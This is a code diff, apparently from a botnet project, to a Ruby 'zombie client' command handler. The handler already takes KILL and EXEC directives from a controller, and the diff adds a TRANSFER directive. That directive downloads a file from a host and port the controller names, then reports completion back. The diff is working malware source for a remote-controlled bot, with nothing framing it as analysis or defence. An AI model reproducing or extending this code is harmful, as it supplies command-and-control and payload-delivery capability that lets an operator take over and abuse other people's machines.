@@ -1,6 +1,8 @@
 # noinspection RubyUnusedLocalVariable
+
 require_relative 'GenericClientReceiveCommandHandler'
 require_relative 'CommandFormatter'
+require_relative 'filetransfer/FileTransferReceiverUtil'
 
 class ZombieClientReceiveCommandHandler < GenericClientReceiveCommandHandler
   @FileTransferPort = 443
@@ -19,6 +21,8 @@ class ZombieClientReceiveCommandHandler < GenericClientReceiveCommandHandler
           DIRECTIVE_KILL(client, creds, params[2..-1]);
         elsif params[1].upcase == 'EXEC'
           DIRECTIVE_EXEC(client, creds, params[2..-1]);
+        elsif params[1].upcase == 'TRANSFER'
+          DIRECTIVE_TRANSFER(client, creds, params[2..-1]);
         end
       end
     end
@@ -50,6 +54,21 @@ class ZombieClientReceiveCommandHandler < GenericClientReceiveCommandHandler
   end
 
   def DIRECTIVE_TRANSFER(client,creds,params)
+    puts "Downloading"
+    ftru = FileTransferReceiverUtil.new
+    puts params
+    ftru.receiveAsync(params[1], params[2], params[4], DownloadCB.new(client, creds))
+  end
+end
 
+class DownloadCB
+  def initialize(client, creds)
+    @client = client
+    @creds = creds
+  end
+
+  def Run
+    @client.write(CommandFormatter.say(@creds, "Download Complete"))
+    puts "Done Downloading"
   end
 end
